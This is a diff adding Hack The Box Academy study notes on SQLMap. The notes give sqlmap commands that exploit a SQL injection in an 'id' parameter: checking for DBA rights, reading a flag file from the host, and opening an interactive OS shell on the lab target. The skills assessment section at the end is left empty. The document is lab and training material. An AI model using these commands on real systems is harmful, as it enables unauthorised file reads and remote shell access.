@@ -174,3 +174,40 @@ sqlmap -r case11.req --batch -p "id" --tamper=between -dbms MySQL -D testdb -T f
 
 >Burp Suite Certified Professional [Study notes on SQLMAP](https://github.com/botesjuan/Burp-Suite-Certified-Practitioner-Exam-Study#sqlmap)  
   
+>[Questions - OS Exploitation](https://academy.hackthebox.com/module/58/section/697)  
+
+> Try to use SQLMap to read the file `/var/www/html/flag.txt`.  
+>Use SQLi vulnerability in GET parameter `id` to exploit the host OS.
+>First check if is DBA permissions?  
+
+```
+sqlmap -r os-exploit.req --batch -p "id" --is-dba --flush-session
+```  
+
+>DBA = true. Read flag File on OS.  
+
+```
+sqlmap -r os-exploit.req --batch -p "id" --dbms MySQL --file-read="/var/www/html/flag.txt"
+
+cat /home/kali/.local/share/sqlmap/output/83.136.248.28/files/_var_www_html_flag.txt
+```  
+
+>Use SQLMap to get an interactive OS shell on the remote host and try to find another flag within the host.
+
+```
+sqlmap -r os-exploit.req --batch -p "id" --os-shell
+```
+
+## Skills Assessment  
+
+>[SQLMAP Skills Assessment](https://academy.hackthebox.com/module/58/section/534)  
+
+>You are given access to a web application with basic protection mechanisms.
+>Use the skills learned in this module to find the SQLi vulnerability with SQLMap and exploit it accordingly. 
+>To complete this module, find the flag and submit it here.  
+
+```
+
+```  
+
+
